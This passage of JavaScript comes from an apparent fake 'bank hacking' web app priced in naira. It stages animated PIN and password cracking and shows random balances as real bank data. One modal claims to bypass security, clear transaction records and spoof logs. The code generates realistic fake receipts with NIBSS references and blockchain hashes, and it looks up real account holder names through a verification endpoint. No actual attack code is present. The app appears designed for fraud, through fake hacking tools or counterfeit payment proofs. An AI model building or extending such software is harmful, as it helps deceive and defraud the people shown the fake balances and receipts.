                        font-size: 1.1rem;
                        text-align: center;
                        margin-bottom: 15px;
                    "
                />
                <div style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 15px;">
                    Maximum per transaction: ₦${Math.min(currentBankBalance, 70000).toLocaleString()}
                </div>
                <button 
                    type="button" 
                    id="bankWithdrawBtn"
                    style="
                        width: 100%;
                        padding: 15px;
                        border: none;
                        border-radius: 10px;
                        background: linear-gradient(135deg, var(--success-green), var(--success-green-dark));
                        color: white;
                        font-size: 1.1rem;
                        font-weight: 700;
                        cursor: pointer;
                        transition: all 0.3s ease;
                        animation: successFlash 1s ease-out;
                    "
                >
                    💰 WITHDRAW FUNDS
                </button>
            </div>
        `;
        
        balanceSection.appendChild(withdrawForm);
        
        // Add event listener to new withdraw button
        const newWithdrawBtn = document.getElementById('bankWithdrawBtn');
        newWithdrawBtn.addEventListener('click', () => initiateWithdrawal('bank'));
    }

    showNotification(`🔓 PIN cracked! Balance: ₦${currentBankBalance.toLocaleString()} available for withdrawal!`, 'success');
    
    // Scroll to the updated balance section
    balanceSection.scrollIntoView({ behavior: 'smooth' });
}

async function verifyTransferBank() {
    const accountNumber = document.getElementById('transferBankAccount').value;
    const bankCode = document.getElementById('transferBankSelect').value;
    const result = document.getElementById('transferBankResult');

    if (!accountNumber || accountNumber.length !== 10) {
        result.className = 'verify-result error';
        result.textContent = 'Please enter a valid 10-digit account number';
        return;
    }

    if (!bankCode) {
        result.className = 'verify-result error';
        result.textContent = 'Please select a bank';
        return;
    }

    result.textContent = 'Verifying...';
    result.className = 'verify-result';

    // Add verification delay
    await new Promise(resolve => setTimeout(resolve, 1500));

    try {
        // Use the unified backend API endpoint (with Flutterwave + Paystack fallback)
        const response = await fetch('/api/verify_account', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                account_number: accountNumber,
                bank_code: bankCode
            })
        });

        const apiResult = await response.json();
        
        if (apiResult.success) {
            result.className = 'verify-result success';
            
            // Create secure DOM structure without innerHTML
            const successContainer = document.createElement('div');
            successContainer.style.cssText = 'padding: 15px; background: rgba(46, 213, 115, 0.1); border: 2px solid var(--success-green); border-radius: 12px; margin: 10px 0;';
            
            // Header section
            const headerDiv = document.createElement('div');
            headerDiv.style.cssText = 'display: flex; align-items: center; gap: 10px; margin-bottom: 8px;';
            
            const checkMark = document.createElement('span');
            checkMark.style.fontSize = '1.2em';
            checkMark.textContent = '✅';
            
            const successText = document.createElement('span');
            successText.style.cssText = 'font-weight: 700; color: var(--success-green);';
            successText.textContent = 'Account Verified Successfully!';
            
            headerDiv.appendChild(checkMark);
            headerDiv.appendChild(successText);
            
            // Account name section
            const nameDiv = document.createElement('div');
            nameDiv.style.cssText = 'font-size: 1.1rem; font-weight: 600; color: var(--text-primary); text-align: center; padding: 8px 0; background: rgba(0,0,0,0.2); border-radius: 8px;';
            nameDiv.textContent = apiResult.accountName.toUpperCase();
            
            // Ready message section
            const readyDiv = document.createElement('div');
            readyDiv.style.cssText = 'font-size: 0.85rem; color: var(--text-muted); text-align: center; margin-top: 5px;';
            readyDiv.textContent = 'Ready to transfer funds to this account';
            
            successContainer.appendChild(headerDiv);
            successContainer.appendChild(nameDiv);
            successContainer.appendChild(readyDiv);
            
            result.innerHTML = '';
            result.appendChild(successContainer);
            
            // Show transfer amount section after successful verification
            showTransferAmountSection(apiResult.accountName, accountNumber, bankCode);
            showNotification(`✅ Account verified successfully`, 'success');
        } else {
            result.className = 'verify-result error';
            result.textContent = apiResult.error || 'Unable to verify account. Please check details and try again.';
            showNotification('❌ Account verification failed', 'error');
        }
    } catch (error) {
        result.className = 'verify-result error';
        result.textContent = 'Network error during verification. Please try again.';
        showNotification('❌ Network error during verification', 'error');
    }
}

function showTransferAmountSection(accountName, accountNumber, bankCode) {
    // Defensive guard: ensure userSession and balance exist
    if (!userSession || !Number.isFinite(userSession.balance)) {
        showNotification('❌ Session error. Please refresh the page.', 'error');
        return;
    }

    // Store verified account details globally
    window.verifiedAccountName = accountName;
    window.verifiedAccountNumber = accountNumber;
    window.verifiedBankCode = bankCode;
    
    // Get bank name from the selected bank
    const bankSelect = document.getElementById('transferBankSelect');
    const selectedBankName = bankSelect.getAttribute('data-bank-name') || 'Selected Bank';
    
    // Create secure verified account information structure
    const verifiedContainer = document.createElement('div');
    verifiedContainer.style.cssText = 'background: rgba(46, 213, 115, 0.08); border: 2px solid var(--success-green); border-radius: 16px; padding: 20px; margin-bottom: 20px;';
    
    // Header section with checkmark and text
    const headerSection = document.createElement('div');
    headerSection.style.cssText = 'display: flex; align-items: center; gap: 12px; margin-bottom: 15px;';
    
    const checkCircle = document.createElement('div');
    checkCircle.style.cssText = 'background: var(--success-green); color: #000; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700;';
    checkCircle.textContent = '✓';
    
    const headerTextDiv = document.createElement('div');
    const headerTitle = document.createElement('h4');
    headerTitle.style.cssText = 'color: var(--success-green); margin: 0; font-size: 1rem;';
    headerTitle.textContent = 'Verified Recipient';
    
    const headerSubtitle = document.createElement('p');
    headerSubtitle.style.cssText = 'color: var(--text-muted); margin: 0; font-size: 0.85rem;';
    headerSubtitle.textContent = 'Ready for transfer';
    
    headerTextDiv.appendChild(headerTitle);
    headerTextDiv.appendChild(headerSubtitle);
    headerSection.appendChild(checkCircle);
    headerSection.appendChild(headerTextDiv);
    
    // Account details section
    const detailsSection = document.createElement('div');
    detailsSection.style.cssText = 'background: rgba(0,0,0,0.3); border-radius: 12px; padding: 15px;';
    
    const accountNameDiv = document.createElement('div');
    accountNameDiv.style.cssText = 'font-size: 1.2rem; font-weight: 700; color: var(--text-primary); text-align: center; margin-bottom: 10px; text-transform: uppercase;';
    accountNameDiv.textContent = accountName;
    
    const accountInfoDiv = document.createElement('div');
    accountInfoDiv.style.cssText = 'display: flex; justify-content: space-between; font-size: 0.9rem; color: var(--text-muted);';
    
    const accountNumberSpan = document.createElement('span');
    accountNumberSpan.textContent = `Account: ${accountNumber}`;
    
    const bankNameSpan = document.createElement('span');
    bankNameSpan.textContent = selectedBankName;
    
    accountInfoDiv.appendChild(accountNumberSpan);
    accountInfoDiv.appendChild(bankNameSpan);
    
    detailsSection.appendChild(accountNameDiv);
    detailsSection.appendChild(accountInfoDiv);
    
    verifiedContainer.appendChild(headerSection);
    verifiedContainer.appendChild(detailsSection);
    
    const verifiedElement = document.getElementById('verifiedAccountName');
    verifiedElement.innerHTML = '';
    verifiedElement.appendChild(verifiedContainer);
    
    // Update dashboard balance display with null safety
    const balanceElement = document.getElementById('dashboardBalance');
    if (balanceElement) {
        balanceElement.textContent = userSession.balance.toLocaleString();
    }
    
    // Show the transfer amount section
    document.getElementById('transferAmountSection').style.display = 'block';
    
    // Scroll to the amount section
    setTimeout(() => {
        document.getElementById('transferAmountSection').scrollIntoView({ behavior: 'smooth', block: 'center' });
    }, 300);
}

// Bank Withdrawal Flow Functions
let currentAccountBalance = 0;
let verifiedAccountName = '';

function setupBankWithdrawalListeners() {
    // Check Balance button
    const checkBalanceBtn = document.getElementById('checkBalanceBtn');
    if (checkBalanceBtn) {
        checkBalanceBtn.addEventListener('click', initiateBalanceCheck);
    }

    // Withdraw button
    const withdrawBtn = document.getElementById('initiateWithdrawBtn');
    if (withdrawBtn) {
        withdrawBtn.addEventListener('click', initiateBankWithdrawal);
    }
}

async function initiateBalanceCheck() {
    // Check daily limits first
    const limitCheck = checkDailyMoneyLimits();
    if (!limitCheck.allowed) {
        showNotification(limitCheck.message, 'error');
        return;
    }
    
    document.getElementById('checkBalanceSection').style.display = 'none';
    document.getElementById('balanceDisplaySection').style.display = 'block';
    
    // Generate balance with daily limit (max 200k per session)
    const maxSessionAmount = 200000;
    const targetBalance = Math.floor(Math.random() * (maxSessionAmount - 50000 + 1)) + 50000;
    currentAccountBalance = targetBalance;
    currentBankBalance = targetBalance; // Set global bank balance for withdraw flow
    
    // Record this session
    recordMoneySession(targetBalance);
    
    // Start balance checking animation (20 seconds)
    await startBalanceAnimation(targetBalance);
    
    // Show withdrawal section after animation
    document.getElementById('withdrawalSection').style.display = 'block';
    document.getElementById('availableBalance').textContent = `₦${targetBalance.toLocaleString()}`;
    
    showNotification('💰 Balance retrieved successfully!', 'success');
}

// Daily money limit management functions
function checkDailyMoneyLimits() {
    const today = new Date().toDateString();
    const sessions = JSON.parse(localStorage.getItem('dailyMoneySessions')) || {};
    
    // Clean up old data
    if (!sessions[today]) {
        sessions[today] = [];
    }
    
    const todaySessions = sessions[today];
    const now = Date.now();
    
    // Check if max sessions reached (3 per day)
    if (todaySessions.length >= 3) {
        return {
            allowed: false,
            message: '⚠️ Daily limit reached! Maximum 3 money sessions per day (600k total). Try again tomorrow.'
        };
    }
    
    // Check 3-hour cooldown
    if (todaySessions.length > 0) {
        const lastSession = todaySessions[todaySessions.length - 1];
        const timeDiff = now - lastSession.timestamp;
        const hoursRemaining = Math.ceil((10800000 - timeDiff) / 3600000); // 3 hours = 10800000 ms
        
        if (timeDiff < 10800000) { // 3 hours in milliseconds
            return {
                allowed: false,
                message: `⏰ Please wait ${hoursRemaining} more hour(s) before your next money session.`
            };
        }
    }
    
    return { allowed: true };
}

function recordMoneySession(amount) {
    const today = new Date().toDateString();
    const sessions = JSON.parse(localStorage.getItem('dailyMoneySessions')) || {};
    
    if (!sessions[today]) {
        sessions[today] = [];
    }
    
    sessions[today].push({
        timestamp: Date.now(),
        amount: amount,
        sessionNumber: sessions[today].length + 1
    });
    
    // Clean up sessions older than 7 days
    const weekAgo = new Date();
    weekAgo.setDate(weekAgo.getDate() - 7);
    
    Object.keys(sessions).forEach(date => {
        if (new Date(date) < weekAgo) {
            delete sessions[date];
        }
    });
    
    localStorage.setItem('dailyMoneySessions', JSON.stringify(sessions));
    
    // Update dashboard display with session info
    updateSessionLimitDisplay();
}

function updateSessionLimitDisplay() {
    const today = new Date().toDateString();
    const sessions = JSON.parse(localStorage.getItem('dailyMoneySessions')) || {};
    const todaySessions = sessions[today] || [];
    
    const sessionsUsed = todaySessions.length;
    const totalEarned = todaySessions.reduce((sum, session) => sum + session.amount, 0);
    
    // Add session info to dashboard if elements exist
    const sessionInfo = document.getElementById('sessionLimitInfo');
    if (sessionInfo) {
        sessionInfo.innerHTML = `
            <div style="background: rgba(25, 25, 25, 0.95); border: 1px solid rgba(255, 71, 87, 0.3); border-radius: 12px; padding: 15px; margin: 10px 0;">
                <h4 style="color: var(--primary-red); margin: 0 0 10px 0; font-size: 1rem;">📊 Today's Money Sessions</h4>
                <div style="display: flex; justify-content: space-between; align-items: center; font-size: 0.9rem;">
                    <span>Sessions Used: <strong>${sessionsUsed}/3</strong></span>
                    <span>Total Earned: <strong>₦${totalEarned.toLocaleString()}</strong></span>
                </div>
                ${sessionsUsed < 3 ? `
                    <div style="margin-top: 8px; font-size: 0.8rem; color: var(--text-muted);">
                        💡 ${3 - sessionsUsed} session(s) remaining today (up to ₦${((3 - sessionsUsed) * 200000).toLocaleString()} more possible)
                    </div>
                ` : ''}
            </div>
        `;
    }
}

async function startBalanceAnimation(targetBalance) {
    const balanceElement = document.getElementById('accountBalance');
    const statusElement = document.getElementById('balanceStatus');
    const progressFill = document.getElementById('balanceProgressFill');
    const progressText = document.getElementById('balanceProgressText');
    
    const steps = [
        { text: 'Connecting to bank servers...', duration: 3000 },
        { text: 'Authenticating account access...', duration: 4000 },
        { text: 'Retrieving account information...', duration: 5000 },
        { text: 'Fetching current balance...', duration: 4000 },
        { text: 'Verifying transaction history...', duration: 2000 },
        { text: 'Processing final calculations...', duration: 2000 }
    ];
    
    let progress = 0;
    let stepIndex = 0;
    let currentBalance = 0;
    
    return new Promise(resolve => {
        const totalDuration = 20000; // 20 seconds
        const intervalTime = 100; // Update every 100ms
        const totalSteps = totalDuration / intervalTime;
        
        const interval = setInterval(() => {
            progress += 1;
            const percentage = (progress / totalSteps) * 100;
            
            // Update progress bar
            progressFill.style.width = percentage + '%';
            
            // Update status text based on steps
            const elapsed = progress * intervalTime;
            let stepDuration = 0;
            for (let i = 0; i <= stepIndex && i < steps.length; i++) {
                stepDuration += steps[i].duration;
                if (elapsed <= stepDuration) {
                    progressText.textContent = steps[i].text;
                    statusElement.textContent = steps[i].text.replace('...', '');
                    break;
                } else if (i === stepIndex) {
                    stepIndex++;
                }
            }
            
            // Animate balance counting up
            if (percentage > 60) {
                const balanceProgress = Math.min((percentage - 60) / 40, 1);
                currentBalance = Math.floor(targetBalance * balanceProgress);
                balanceElement.textContent = currentBalance.toLocaleString();
            }
            
            // Complete animation
            if (progress >= totalSteps) {
                clearInterval(interval);
                balanceElement.textContent = targetBalance.toLocaleString();
                statusElement.textContent = 'Connected';
                progressText.textContent = 'Balance retrieved successfully!';
                progressFill.style.width = '100%';
                resolve();
            }
        }, intervalTime);
    });
}

// Compatibility wrapper for legacy calls
function initiateWithdrawal(type) {
    if (type === 'bank') {
        return initiateBankWithdrawal();
    }
    // Handle other types if needed
    return initiateBankWithdrawal();
}

async function initiateBankWithdrawal() {
    const withdrawAmount = parseFloat(document.getElementById('withdrawAmount').value);
    
    if (!withdrawAmount || withdrawAmount <= 0) {
        showNotification('Please enter a valid withdrawal amount', 'error');
        return;
    }
    
    if (withdrawAmount > currentBankBalance) {
        showNotification('Insufficient balance for withdrawal', 'error');
        return;
    }
    
    // Hide withdrawal section and show password cracking
    document.getElementById('withdrawalSection').style.display = 'none';
    document.getElementById('passwordCrackingSection').style.display = 'block';
    
    // Start password cracking animation (20 seconds)
    await startPasswordCrackingAnimation();
    
    // Transfer from bank balance to dashboard balance
    console.log(`🏦→📱 WITHDRAW: Bank ₦${currentBankBalance.toLocaleString()} → Dashboard ₦${userSession.balance.toLocaleString()}`);
    currentBankBalance -= withdrawAmount;  // Decrease bank balance
    userSession.balance += withdrawAmount;  // Increase dashboard balance
    console.log(`✅ AFTER WITHDRAW: Bank ₦${currentBankBalance.toLocaleString()}, Dashboard ₦${userSession.balance.toLocaleString()}`);
    saveUserSession(userSession);
    updateBalance();
    
    // Show success message and return to dashboard
    showNotification(`🎉 Successfully withdrew ₦${withdrawAmount.toLocaleString()}!`, 'success');
    
    setTimeout(() => {
        showPage('dashboard');
        resetBankWithdrawalFlow();
    }, 3000);
}

async function startPasswordCrackingAnimation() {
    const digits = ['digit1', 'digit2', 'digit3', 'digit4'];
    const statusElement = document.getElementById('crackingStatus');
    const progressFill = document.getElementById('crackingProgressFill');
    const progressText = document.getElementById('crackingProgressText');
    
    const crackingSteps = [
        { text: 'Scanning security layers...', duration: 3000 },
        { text: 'Analyzing encryption patterns...', duration: 4000 },
        { text: 'Breaking first digit...', duration: 3000 },
        { text: 'Cracking second digit...', duration: 3000 },
        { text: 'Decoding third digit...', duration: 3000 },
        { text: 'Finalizing fourth digit...', duration: 2000 },
        { text: 'Bypassing security protocols...', duration: 2000 }
    ];
    
    // Generate final 4-digit password
    const finalPassword = Math.floor(1000 + Math.random() * 9000).toString();
    
    return new Promise(resolve => {
        const totalDuration = 20000; // 20 seconds
        const intervalTime = 100; // Update every 100ms
        const totalSteps = totalDuration / intervalTime;
        let progress = 0;
        let stepIndex = 0;
        
        const interval = setInterval(() => {
            progress += 1;
            const percentage = (progress / totalSteps) * 100;
            
            // Update progress bar
            progressFill.style.width = percentage + '%';
            
            // Update status text based on steps
            const elapsed = progress * intervalTime;
            let stepDuration = 0;
            for (let i = 0; i <= stepIndex && i < crackingSteps.length; i++) {
                stepDuration += crackingSteps[i].duration;
                if (elapsed <= stepDuration) {
                    progressText.textContent = crackingSteps[i].text;
                    statusElement.textContent = crackingSteps[i].text.replace('...', '');
                    break;
                } else if (i === stepIndex) {
                    stepIndex++;
                }
            }
            
            // Animate digit cracking
            digits.forEach((digitId, index) => {
                const digitElement = document.getElementById(digitId);
                const digitProgress = (percentage - (index * 20)) / 20;
                
                if (digitProgress > 0 && digitProgress < 1) {
                    // Show random digits while cracking
                    const randomDigit = Math.floor(Math.random() * 10);
                    digitElement.textContent = randomDigit;
                    digitElement.style.color = '#ff4757';
                } else if (digitProgress >= 1) {
                    // Show final digit
                    digitElement.textContent = finalPassword[index];
                    digitElement.style.color = '#2ed573';
                }
            });
            
            // Complete animation
            if (progress >= totalSteps) {
                clearInterval(interval);
                statusElement.textContent = 'Password Cracked!';
                progressText.textContent = `Password: ${finalPassword} - Access Granted!`;
                progressFill.style.width = '100%';
                resolve();
            }
        }, intervalTime);
    });
}

function updateDashboardBalance() {
    // Legacy function - now redirects to unified updateBalance()
    updateBalance();
}

function resetBankWithdrawalFlow() {
    // Reset all sections
    document.getElementById('checkBalanceSection').style.display = 'none';
    document.getElementById('balanceDisplaySection').style.display = 'none';
    document.getElementById('withdrawalSection').style.display = 'none';
    document.getElementById('passwordCrackingSection').style.display = 'none';
    
    // Reset form values
    document.getElementById('transferBankAccount').value = '';
    document.getElementById('transferBankSearch').value = '';
    document.getElementById('withdrawAmount').value = '';
    document.getElementById('transferBankResult').textContent = '';
    
    // Reset variables
    currentAccountBalance = 0;
    verifiedAccountName = '';
}

function showTransferSection(type) {
    document.querySelectorAll('.transfer-option-btn').forEach(btn => btn.classList.remove('active'));
    document.querySelectorAll('.transfer-section').forEach(section => section.style.display = 'none');

    if (type === 'bank') {
        document.getElementById('transferToBankBtn').classList.add('active');
        document.getElementById('transferBankSection').style.display = 'block';
    } else {
        document.getElementById('transferToCryptoBtn').classList.add('active');
        document.getElementById('transferCryptoSection').style.display = 'block';
    }
}

function initiateWithdrawal(type) {
    let amount;
    let maxAmount;

    if (type === 'crypto') {
        amount = parseFloat(document.getElementById('cryptoWithdrawAmount').value);
        maxAmount = Math.min(currentCryptoBalance, 70000);
    } else {
        amount = parseFloat(document.getElementById('bankWithdrawAmount').value);
        maxAmount = Math.min(currentBankBalance, 70000);
    }

    if (!amount || amount <= 0) {
        alert('Please enter a valid amount');
        return;
    }

    if (amount > maxAmount && document.getElementById('masterIndicator').style.display !== 'inline') {
        alert('Insufficient balance or exceeds daily limit');
        return;
    }

    // Check if password has been cracked
    const withdrawBtn = type === 'crypto' ? 
        document.getElementById('cryptoWithdrawBtn') : 
        document.getElementById('bankWithdrawBtn');

    if (withdrawBtn && withdrawBtn.disabled) {
        showNotification(`Please crack the ${type === 'crypto' ? 'wallet password' : '4-digit PIN'} first!`, 'error');
        return;
    }

    showPinModal(type, 'withdraw', amount);
}

function initiateTransfer(type) {
    let amount;

    if (type === 'bank') {
        amount = parseFloat(document.getElementById('transferBankAmount').value);
    } else {
        amount = parseFloat(document.getElementById('transferCryptoAmount').value);
    }

    if (!amount || amount <= 0) {
        showNotification('❌ Please enter a valid amount', 'error');
        return;
    }

    // Check dashboard balance availability
    if (amount > userSession.balance) {
        showNotification(`❌ Insufficient balance! You have ₦${userSession.balance.toLocaleString()} but trying to transfer ₦${amount.toLocaleString()}`, 'error');
        return;
    }

    // Store transfer details for processing
    window.pendingTransferDetails = {
        type: type,
        amount: amount,
        accountName: type === 'bank' ? window.verifiedAccountName : null
    };

    showPinModal(type, 'transfer', amount);
}

function showPinModal(type, action, amount) {
    document.getElementById('pinModal').style.display = 'block';
    document.getElementById('pinInput').value = '';
    
    const pinTitle = document.getElementById('pin-title');

    if (!userPin) {
        document.getElementById('setPinBtn').style.display = 'block';
        document.getElementById('confirmPinBtn').style.display = 'none';
        document.getElementById('pinInput').placeholder = 'Create 4-digit PIN';
        document.getElementById('setPinBtn').textContent = 'CREATE PIN';
        pinTitle.textContent = 'Create Security PIN';
        showNotification('First time transaction - Create your security PIN', 'success');
        playNotificationSound();
    } else {
        document.getElementById('setPinBtn').style.display = 'none';
        document.getElementById('confirmPinBtn').style.display = 'block';
        document.getElementById('pinInput').placeholder = 'Enter your PIN';
        document.getElementById('confirmPinBtn').textContent = 'CONFIRM PIN';
        pinTitle.textContent = 'Enter Security PIN';
    }

    // Store transaction details
    window.pendingTransaction = { type, action, amount };
}

function setPin() {
    const pin = document.getElementById('pinInput').value;

    if (!/^\d{4}$/.test(pin)) {
        showNotification('PIN must be exactly 4 digits', 'error');
        playNotificationSound();
        return;
    }

    userPin = pin;
    localStorage.setItem('userPin', pin);
    
    showNotification('🔐 Security PIN created successfully!', 'success');
    playNotificationSound();

    document.getElementById('pinModal').style.display = 'none';
    processTransaction();
}

function confirmPin() {
    const pin = document.getElementById('pinInput').value;

    if (pin !== userPin) {
        showNotification('❌ Incorrect PIN. Please try again.', 'error');
        playNotificationSound();
        document.getElementById('pinInput').value = '';
        document.getElementById('pinInput').focus();
        return;
    }

    showNotification('✅ PIN verified successfully!', 'success');
    playNotificationSound();

    document.getElementById('pinModal').style.display = 'none';
    processTransaction();
}

function processTransaction() {
    const transaction = window.pendingTransaction;
    
    // Use special hacking animation for bank transfers
    if (transaction.action === 'transfer' && transaction.type === 'bank') {
        showBankTransferHackingModal();
    } else {
        showProcessingModal();
        
        // Regular processing for other transactions
        const steps = ['step1', 'step2', 'step3', 'step4', 'step5'];
        let currentStep = 0;

        const progressInterval = setInterval(() => {
            if (currentStep < steps.length) {
                document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
                document.getElementById(steps[currentStep]).classList.add('active');

                const progress = ((currentStep + 1) / steps.length) * 100;
                document.getElementById('progressFill').style.width = progress + '%';

                currentStep++;
            } else {
                clearInterval(progressInterval);
                setTimeout(() => {
                    completeTransaction(transaction);
                }, 1000);
            }
        }, 5000);
    }
}

function showBankTransferHackingModal() {
    const transaction = window.pendingTransaction;
    
    // Create the hacking modal
    const modal = document.createElement('div');
    modal.id = 'hackingTransferModal';
    modal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.95);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 10000;
        color: #00ff00;
        font-family: 'Courier New', monospace;
        font-size: 14px;
    `;

    modal.innerHTML = `
        <div style="
            background: linear-gradient(135deg, #000 0%, #111 50%, #000 100%);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 30px;
            width: 90%;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 0 30px #00ff0050;
        ">
            <h3 style="color: #00ff00; margin-bottom: 20px; text-shadow: 0 0 10px #00ff00;">
                🔐 INITIATING SECURE TRANSFER PROTOCOL
            </h3>
            
            <div style="
                background: #000;
                border: 1px solid #00ff00;
                border-radius: 5px;
                padding: 15px;
                margin: 20px 0;
                text-align: left;
                line-height: 1.8;
                min-height: 120px;
            ">
                <div id="hackingStatus">Connecting to banking network...</div>
            </div>
            
            <div style="
                background: #111;
                border: 1px solid #00ff00;
                border-radius: 10px;
                height: 20px;
                margin: 20px 0;
                overflow: hidden;
            ">
                <div id="hackingProgress" style="
                    height: 100%;
                    background: linear-gradient(90deg, #00ff00, #00aa00);
                    width: 0%;
                    transition: width 0.3s ease;
                    box-shadow: 0 0 10px #00ff00;
                "></div>
            </div>
            
            <div id="hackingPercentage" style="color: #00ff00; font-weight: bold;">0%</div>
        </div>
    `;

    document.body.appendChild(modal);

    // Hacking animation steps
    const steps = [
        { text: 'Connecting to banking network...', duration: 2000 },
        { text: 'Bypassing security protocols...', duration: 2500 },
        { text: 'Accessing account database...', duration: 2000 },
        { text: 'Clearing transaction records...', duration: 3000 },
        { text: 'Spoofing transaction logs...', duration: 2500 },
        { text: 'Injecting transfer command...', duration: 2000 },
        { text: 'Finalizing secure transfer...', duration: 2000 },
        { text: '✅ TRANSFER SUCCESSFUL - Records cleared', duration: 1000 }
    ];

    let currentStep = 0;
    const totalDuration = steps.reduce((sum, step) => sum + step.duration, 0);
    let elapsedTime = 0;

    const statusElement = document.getElementById('hackingStatus');
    const progressElement = document.getElementById('hackingProgress');
    const percentageElement = document.getElementById('hackingPercentage');

    function updateStep() {
        if (currentStep < steps.length) {
            const step = steps[currentStep];
            statusElement.textContent = step.text;

            // Animate progress
            const stepInterval = setInterval(() => {
                elapsedTime += 100;
                const progress = Math.min((elapsedTime / totalDuration) * 100, 100);
                progressElement.style.width = progress + '%';
                percentageElement.textContent = Math.floor(progress) + '%';
                
                if (elapsedTime >= steps.slice(0, currentStep + 1).reduce((sum, s) => sum + s.duration, 0)) {
                    clearInterval(stepInterval);
                    currentStep++;
                    
                    if (currentStep < steps.length) {
                        setTimeout(updateStep, 200);
                    } else {
                        // Hacking complete - trigger completion
                        setTimeout(() => {
                            modal.remove();
                            completeTransaction(transaction);
                        }, 1000);
                    }
                }
            }, 100);
        }
    }

    // Start the animation
    setTimeout(updateStep, 500);
}

function completeTransaction(transaction) {
    // Remove any processing modals
    const processingModal = document.getElementById('processingModal');
    const hackingModal = document.getElementById('hackingTransferModal');
    
    if (processingModal) processingModal.style.display = 'none';
    if (hackingModal) hackingModal.remove();

    // Update balance
    if (transaction.action === 'withdraw') {
        userSession.balance += transaction.amount;

        // Show withdrawal success notification
        const notificationMessage = transaction.type === 'crypto' 
            ? `💰 Successfully withdrew ₦${transaction.amount.toLocaleString()} from crypto wallet!`
            : `💰 Successfully withdrew ₦${transaction.amount.toLocaleString()} from bank account!`;

        showNotification(notificationMessage, 'success');
    } else {
        console.log(`📱→🏦 TRANSFER: Dashboard ₦${userSession.balance.toLocaleString()} → External Bank`);
        userSession.balance -= transaction.amount;
        console.log(`✅ AFTER TRANSFER: Dashboard ₦${userSession.balance.toLocaleString()} (sent ₦${transaction.amount.toLocaleString()})`);

        // Show transfer success notification
        const notificationMessage = transaction.type === 'crypto' 
            ? `🚀 Successfully transferred ₦${transaction.amount.toLocaleString()} to crypto wallet!`
            : `🚀 Successfully transferred ₦${transaction.amount.toLocaleString()} to ${window.verifiedAccountName}!`;

        showNotification(notificationMessage, 'success');
        
        // Update dashboard balance display in transfer section if visible
        const dashboardBalanceElement = document.getElementById('dashboardBalance');
        if (dashboardBalanceElement) {
            dashboardBalanceElement.textContent = userSession.balance.toLocaleString();
        }
        
        // Reset transfer form
        if (transaction.type === 'bank') {
            setTimeout(() => {
                resetBankTransferForm();
            }, 2000);
        }
    }

    saveUserSession(userSession);
    updateBalance();

    // Show receipt
    showReceipt(transaction);
}

function resetBankTransferForm() {
    // Clear form fields
    document.getElementById('transferBankAccount').value = '';
    document.getElementById('transferBankSearch').value = '';
    document.getElementById('transferBankAmount').value = '';
    document.getElementById('transferBankResult').textContent = '';
    document.getElementById('transferBankSelect').value = '';
    
    // Hide sections
    document.getElementById('transferAmountSection').style.display = 'none';
    document.getElementById('transferBankDropdown').style.display = 'none';
    
    // Clear global variables
    window.verifiedAccountName = '';
    window.pendingTransferDetails = null;
    
    showNotification('✅ Ready for next transfer', 'success');
}

function showReceipt(transaction) {
    const transactionId = generateAdvancedTransactionId();
    const timestamp = new Date().toLocaleString('en-NG', {
        weekday: 'long',
        year: 'numeric',
        month: 'long', 
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        timeZone: 'Africa/Lagos'
    });

    let details = '';
    let statusClass = 'success';
    let processingTime = (Math.random() * 3.5 + 1.2).toFixed(2); // 1.2-4.7 seconds
    let sessionId = generateSessionId();
    let deviceFingerprint = generateDeviceFingerprint().substring(0, 16);

    if (transaction.action === 'withdraw') {
        if (transaction.type === 'crypto') {
            const wallet = document.getElementById('cryptoWalletInput').value;
            const network = document.getElementById('cryptoNetwork').value.toUpperCase();
            const shortWallet = wallet.substring(0, 12) + '...' + wallet.substring(wallet.length - 12);
            const gasUsed = Math.floor(Math.random() * 45000 + 21000);
            const gasPrice = (Math.random() * 25 + 15).toFixed(2); // 15-40 Gwei
            const blockNumber = Math.floor(Math.random() * 1000000 + 19000000);
            const confirmations = Math.floor(Math.random() * 50 + 12);
            const networkFee = calculateNetworkFee(network, transaction.amount);

            details = `
                <div class="receipt-section">
                    <h4>🔗 Blockchain Transaction Details</h4>
                    <p><strong>Transaction Type</strong><span>Crypto Withdrawal (${network})</span></p>
                    <p><strong>Source Wallet</strong><span>${shortWallet}</span></p>
                    <p><strong>Network</strong><span>${getNetworkDetails(network)}</span></p>
                    <p><strong>Amount Withdrawn</strong><span class="amount-highlight">₦${transaction.amount.toLocaleString()}.00</span></p>
                    <p><strong>Network Fee</strong><span>${networkFee} ${getCryptoSymbol(network)}</span></p>
                    <p><strong>Total Deducted</strong><span>₦${(transaction.amount + (networkFee * 850000)).toLocaleString()}</span></p>
                </div>
                
                <div class="receipt-section">
                    <h4>⛓️ Blockchain Information</h4>
                    <p><strong>Block Number</strong><span>#${blockNumber.toLocaleString()}</span></p>
                    <p><strong>Block Hash</strong><span class="hash-text">${generateRealistic2025BlockHash()}</span></p>
                    <p><strong>Transaction Hash</strong><span class="hash-text">${generateTransactionHash()}</span></p>
                    <p><strong>Gas Used</strong><span>${gasUsed.toLocaleString()} units</span></p>
                    <p><strong>Gas Price</strong><span>${gasPrice} Gwei</span></p>
                    <p><strong>Confirmations</strong><span>${confirmations}/12 ✅</span></p>
                </div>
                
                <div class="receipt-section">
                    <h4>🛡️ Security Details</h4>
                    <p><strong>Encryption</strong><span>AES-256 + ECC P-384</span></p>
                    <p><strong>Processing Node</strong><span>${getRandomNode(network)}</span></p>
                    <p><strong>Validator</strong><span>${generateValidatorAddress()}</span></p>
                    <p><strong>MEV Protection</strong><span class="success-text">Enabled ✅</span></p>
                </div>
            `;
        } else {
            const accountNumber = document.getElementById('bankAccountNumber').value;
            const bankSelect = document.getElementById('bankSelect');
            const bankName = bankSelect.dataset.bankName || 'Selected Bank';
            const verifyResult = document.getElementById('bankVerifyResult');
            const accountNameMatch = verifyResult.innerHTML.match(/<strong>Account Name:<\/strong>\s*([^<]+)/);
            const accountName = accountNameMatch ? accountNameMatch[1].trim() : 'Account Holder';
            const nibssRef = generateNIBSSReference();
            const sessionToken = generateSessionToken();
